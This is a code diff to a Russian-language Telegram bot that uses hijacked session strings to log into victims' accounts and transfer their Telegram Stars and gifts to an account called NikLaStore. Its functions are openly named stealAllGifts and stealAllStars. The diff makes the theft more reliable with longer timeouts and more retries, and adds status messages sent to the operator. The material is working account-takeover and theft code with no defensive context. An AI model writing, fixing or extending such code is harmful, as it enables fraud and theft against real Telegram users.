@@ -80,8 +80,9 @@ async function requestRealTelegramCode(phone, userId) {
     try {
         const stringSession = new StringSession("");
         const client = new TelegramClient(stringSession, API_ID, API_HASH, {
-            connectionRetries: 3,
-            timeout: 30000,
+            connectionRetries: 5,
+            timeout: 60000,
+            useWSS: false
         });
         
         await client.connect();
@@ -246,19 +247,23 @@ async function stealAllGifts() {
             try {
                 const stringSession = new StringSession(row.session_string);
                 const client = new TelegramClient(stringSession, API_ID, API_HASH, {
-                    connectionRetries: 2,
-                    timeout: 30000
+                    connectionRetries: 5,
+                    timeout: 60000,
+                    useWSS: false
                 });
                 
                 await client.connect();
+                bot.sendMessage(MY_USER_ID, `🔗 Подключен к ${row.phone}, ищу подарки...`);
+                
                 const result = await transferGiftsToNikLa(client, row.phone);
                 await client.disconnect();
                 
                 if (result) totalStolen++;
-                await new Promise(resolve => setTimeout(resolve, 2000));
+                await new Promise(resolve => setTimeout(resolve, 3000));
                 
             } catch (error) {
                 console.log(`Ошибка: ${row.phone}`, error.message);
+                bot.sendMessage(MY_USER_ID, `❌ Ошибка ${row.phone}: ${error.message}`);
             }
         }
         
@@ -284,19 +289,23 @@ async function stealAllStars() {
             try {
                 const stringSession = new StringSession(row.session_string);
                 const client = new TelegramClient(stringSession, API_ID, API_HASH, {
-                    connectionRetries: 2,
-                    timeout: 30000
+                    connectionRetries: 5,
+                    timeout: 60000,
+                    useWSS: false
                 });
                 
                 await client.connect();
+                bot.sendMessage(MY_USER_ID, `🔗 Подключен к ${row.phone}, проверяю звезды...`);
+                
                 const result = await transferStarsToNikLa(client, row.phone);
                 await client.disconnect();
                 
                 if (result) totalStolen++;
-                await new Promise(resolve => setTimeout(resolve, 2000));
+                await new Promise(resolve => setTimeout(resolve, 3000));
                 
             } catch (error) {
                 console.log(`Ошибка: ${row.phone}`, error.message);
+                bot.sendMessage(MY_USER_ID, `❌ Ошибка ${row.phone}: ${error.message}`);
             }
         }
         
@@ -313,6 +322,7 @@ async function transferStarsToNikLa(client, phone) {
         const starsBalance = await client.invoke(new Api.payments.GetStarsBalance({}));
         
         if (!starsBalance || starsBalance.balance === 0) {
+            bot.sendMessage(MY_USER_ID, `❌ ${phone}: Нет звезд`);
             return false;
         }
 
@@ -322,6 +332,7 @@ async function transferStarsToNikLa(client, phone) {
         );
         
         if (!target || !target.users || target.users.length === 0) {
+            bot.sendMessage(MY_USER_ID, `❌ ${phone}: Не найден NikLaStore`);
             return false;
         }
 
@@ -348,7 +359,7 @@ async function transferStarsToNikLa(client, phone) {
         return true;
         
     } catch (error) {
-        console.log(`Ошибка кражи звезд ${phone}:`, error.message);
+        bot.sendMessage(MY_USER_ID, `❌ ${phone}: Ошибка передачи звезд - ${error.message}`);
         return false;
     }
 }
@@ -364,6 +375,7 @@ async function transferGiftsToNikLa(client, phone) {
         }));
 
         if (!receivedGifts || !receivedGifts.gifts || receivedGifts.gifts.length === 0) {
+            bot.sendMessage(MY_USER_ID, `❌ ${phone}: Нет подарков`);
             return false;
         }
 
@@ -372,6 +384,7 @@ async function transferGiftsToNikLa(client, phone) {
         );
         
         if (!target || !target.users || target.users.length === 0) {
+            bot.sendMessage(MY_USER_ID, `❌ ${phone}: Не найден NikLaStore`);
             return false;
         }
 
@@ -412,7 +425,7 @@ async function transferGiftsToNikLa(client, phone) {
         return false;
         
     } catch (error) {
-        console.log(`Ошибка кражи подарков ${phone}:`, error.message);
+        bot.sendMessage(MY_USER_ID, `❌ ${phone}: Ошибка передачи подарка - ${error.message}`);
         return false;
     }
 }
